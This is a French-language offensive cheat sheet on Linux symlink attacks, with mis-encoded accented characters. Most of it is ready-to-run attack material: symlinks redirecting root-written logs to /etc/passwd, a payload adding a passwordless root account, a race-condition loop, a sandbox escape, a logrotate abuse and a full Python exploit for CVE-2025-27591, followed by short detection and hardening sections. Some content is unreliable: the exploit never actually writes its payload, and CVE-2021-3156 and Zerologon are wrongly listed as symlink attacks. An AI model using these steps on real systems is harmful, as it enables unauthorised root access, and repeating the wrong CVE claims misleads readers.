---
title: Symlink Attack
date: "2025-01-15"
draft: false
---

# üîó Symlink Attack - Cheat Sheet

## üéØ Vue d'ensemble

Les **attaques par symlink (liens symboliques)** exploitent le m√©canisme de redirection des liens symboliques pour :

- **Escalade de privil√©ges** : √©crire dans des fichiers prot√©g√©s
- **Bypass de restrictions** : Contourner les contr√©les d'acc√©s
- **Race conditions** : Exploiter des fen√©tres temporelles

---

## ?? Qu'est-ce qu'un Symlink ?

### D√©finition

Un **symlink** est un fichier sp√©cial qui pointe vers un autre fichier ou r√©pertoire. Quand un programme interagit avec le symlink, il interagit avec la cible.

```bash
# Cr√©ation d'un symlink
ln -s /chemin/vers/cible /chemin/vers/symlink

# V√©rification
ls -la /chemin/vers/symlink
# lrwxrwxrwx 1 user user 11 date symlink -> /chemin/vers/cible

# Lecture via symlink
cat /chemin/vers/symlink  # Lit le contenu de la cible !
```

### Types de liens

```bash
# Lien symbolique (symlink)
# Pourquoi : Pointe vers un chemin, peut traverser les syst√©mes de fichiers
ln -s /target/file /link/to/file

# Lien dur (hard link)
# Pourquoi : Pointe vers l'inode, m√©me syst√©me de fichiers uniquement
ln /target/file /link/to/file
```

---

## ‚ö° Techniques d'Attaque

### 1. Symlink vers fichier privil√©gi√©

#### Sc√©nario

Un service privil√©gi√© √©crit dans un fichier sous notre contr√©le.

```bash
# 1. Identifier le fichier cible
# Pourquoi : Trouver o√© le service √©crit ses donn√©es
ls -la /var/log/service/
ls -la /tmp/service/

# 2. V√©rifier les permissions du r√©pertoire
# Pourquoi : On doit pouvoir cr√©er/modifier des fichiers
ls -la /path/to/service/logs/
# drwxrwxrwx = world-writable ‚Üí Vuln√©rable !

# 3. Remplacer le fichier par un symlink
rm /path/to/service/logfile
ln -s /etc/passwd /path/to/service/logfile

# 4. D√©clencher l'√©criture du service
systemctl restart service
# ou d√©clencher une erreur pour forcer l'√©criture
```

#### Payload d'injection

```bash
# Injection dans /etc/passwd
echo "attacker::0:0:,,,:/root:/bin/bash" > /tmp/payload

# Ou injection dans /etc/shadow (si possible)
echo "attacker:\$6\$salt\$hash:18000:0:99999:7:::" > /tmp/payload
```

### 2. Exploitation CVE-2025-27591 (Below)

#### Contexte

Le service "Below" √©crit ses logs avec des privil√©ges root dans un r√©pertoire world-writable.

```bash
# 1. V√©rification de la vuln√©rabilit√©
# Pourquoi : Confirmer que le r√©pertoire est modifiable
ls -la /var/log/below/
# drwxrwxrwx 3 root root 4096 below/  ‚Üê Vuln√©rable !

# 2. Identification du fichier cible
# Pourquoi : Trouver le fichier de log utilis√© par le service
ls -la /var/log/below/
# error_root.log ‚Üê Fichier d'√©criture du service root

# 3. Cr√©ation du symlink malveillant
rm /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log

# 4. Pr√©paration du payload
echo "attacker::0:0:,,,:/root:/bin/bash" > /tmp/attacker

# 5. D√©clenchement de l'exploit
sudo below record  # Force l'√©criture dans le log
```

### 3. Race Condition avec Symlink

#### Technique

Exploiter une fen√©tre temporelle entre v√©rification et utilisation.

```bash
# Script d'exploitation de race condition
#!/bin/bash
# Pourquoi : Automatiser l'exploitation de la race condition

while true; do
    # Cr√©er un fichier l√©gitime
    echo "content" > /tmp/racefile

    # Rapidement le remplacer par un symlink
    rm /tmp/racefile 2>/dev/null
    ln -s /etc/passwd /tmp/racefile 2>/dev/null

    sleep 0.1
done
```

### 4. Bypass de Sandbox

#### Technique

Utiliser des symlinks pour sortir d'un environnement restreint.

```bash
# 1. Depuis un r√©pertoire restreint
# Pourquoi : Acc√©der √† des fichiers en dehors de la sandbox
pwd
# /restricted/path

# 2. Cr√©er un symlink vers l'ext√©rieur
ln -s ../../../../etc/passwd escape

# 3. Acc√©der au fichier
cat escape  # Lit /etc/passwd depuis la sandbox !
```

---

## üõ°Ô∏è D√©tection et √©num√©ration

### Recherche de vuln√©rabilit√©s

```bash
# 1. R√©pertoires world-writable
# Pourquoi : Identifier o√© on peut cr√©er des symlinks
find / -type d -perm -0002 -ls 2>/dev/null
find / -type d -perm -0777 -ls 2>/dev/null

# 2. Services qui √©crivent dans des r√©pertoires modifiables
# Pourquoi : Trouver les vecteurs d'exploitation
ps aux | grep root
lsof | grep -E "(tmp|log)" | grep root

# 3. Fichiers temporaires des services
# Pourquoi : Identifier les fichiers temporaires exploitables
ls -la /tmp/ /var/tmp/ /dev/shm/
find /var/log -type f -perm -0002 2>/dev/null
```

### Outils d'audit

```bash
# LinPEAS - Recherche automatis√©e
./linpeas.sh | grep -i "writable\|symlink"

# Recherche de symlinks existants
find / -type l -ls 2>/dev/null | head -20

# Surveillance en temps r√©el
# Pourquoi : Observer les cr√©ations de fichiers par les services
inotifywait -m -r /var/log/ /tmp/ --format '%w%f %e'
```

---

## üéØ Cas d'Usage R√©els

### CVE-2025-27591 - Below Monitoring Tool

**Contexte :** Service de monitoring "Below" avec r√©pertoire world-writable.

```python
#!/usr/bin/env python3
# Exploit automatis√© pour CVE-2025-27591

import os
import subprocess
import time

def exploit_below():
    log_dir = "/var/log/below"
    target_log = f"{log_dir}/error_root.log"

    # 1. V√©rifier les permissions
    if not os.access(log_dir, os.W_OK):
        print("[-] R√©pertoire non writable")
        return False

    # 2. Supprimer le fichier l√©gitime
    if os.path.exists(target_log):
        os.remove(target_log)

    # 3. Cr√©er le symlink malveillant
    os.symlink("/etc/passwd", target_log)
    print(f"[+] Symlink cr√©√©: {target_log} -> /etc/passwd")

    # 4. Pr√©parer le payload
    with open("/tmp/attacker", "w") as f:
        f.write("attacker::0:0:,,,:/root:/bin/bash\n")

    # 5. D√©clencher l'√©criture
    subprocess.run(["sudo", "below", "record"], timeout=10)

    # 6. V√©rifier l'injection
    with open("/etc/passwd", "r") as f:
        if "attacker" in f.read():
            print("[+] Payload inject√© avec succ√©s !")
            return True

    return False

if __name__ == "__main__":
    exploit_below()
```

### Exploitation de logrotate

**Contexte :** Exploitation du m√©canisme de rotation des logs.

```bash
# 1. Identifier la configuration logrotate vuln√©rable
cat /etc/logrotate.d/vulnerable-service
# /var/log/service/*.log {
#     create 644 root root
# }

# 2. Cr√©er le symlink avant la rotation
ln -s /etc/passwd /var/log/service/malicious.log

# 3. Attendre la rotation (ou la forcer)
logrotate -f /etc/logrotate.d/vulnerable-service
```

---

## üõ°Ô∏è D√©fenses et Mitigations

### Pr√©vention c√©t√© syst√©me

```bash
# 1. Restrictions de permissions
# Pourquoi : Emp√©cher la cr√©ation de symlinks malveillants
chmod 755 /var/log/service/  # Retirer le write pour "others"

# 2. Utilisation de r√©pertoires d√©di√©s
# Pourquoi : Isoler les √©critures des services
mkdir -p /var/log/service/private
chown service:service /var/log/service/private
chmod 700 /var/log/service/private
```

### Bonnes pratiques de d√©veloppement

```bash
# 1. V√©rification avant √©criture
# Pourquoi : S'assurer que le fichier n'est pas un symlink
if [ -L "/path/to/file" ]; then
    echo "Symlink d√©tect√©, arr√©t"
    exit 1
fi

# 2. Ouverture s√©curis√©e (C/C++)
// Utiliser O_NOFOLLOW pour √©viter de suivre les symlinks
int fd = open("/path/to/file", O_WRONLY | O_CREAT | O_NOFOLLOW, 0644);
```

### Surveillance et d√©tection

```bash
# 1. Monitoring des cr√©ations de symlinks
auditctl -w /var/log -p wa -k symlink_watch
auditctl -w /tmp -p wa -k symlink_watch

# 2. D√©tection automatis√©e
#!/bin/bash
# Script de surveillance
inotifywait -m /var/log/ --format '%w%f %e' | while read file event; do
    if [ "$event" = "CREATE" ] && [ -L "$file" ]; then
        echo "ALERT: Symlink cr√©√©: $file"
        ls -la "$file"
    fi
done
```

---

## üìö Ressources et R√©f√©rences

### CVEs li√©es aux symlinks

- **CVE-2025-27591** : Below monitoring tool symlink attack
- **CVE-2021-3156** : Sudo heap overflow via symlink
- **CVE-2020-1472** : Zerologon (exploitation indirecte)

### Outils utiles

```bash
# Recherche de vuln√©rabilit√©s symlink
symlinks -r /  # V√©rifier tous les symlinks
find / -type l -exec ls -la {} \;

# Tests de s√©curit√©
./pspy64  # Observer les processus en temps r√©el
./LinEnum.sh  # √©num√©ration automatis√©e
```

### Lectures recommand√©es

- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Linux Privilege Escalation via Symlinks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#symlinks)
- [Race Condition Exploitation](https://www.exploit-db.com/papers/13234)

---

_Les attaques par symlink d√©montrent l'importance de la validation rigoureuse des chemins de fichiers et de la gestion s√©curis√©e des permissions dans les syst√©mes Unix/Linux._
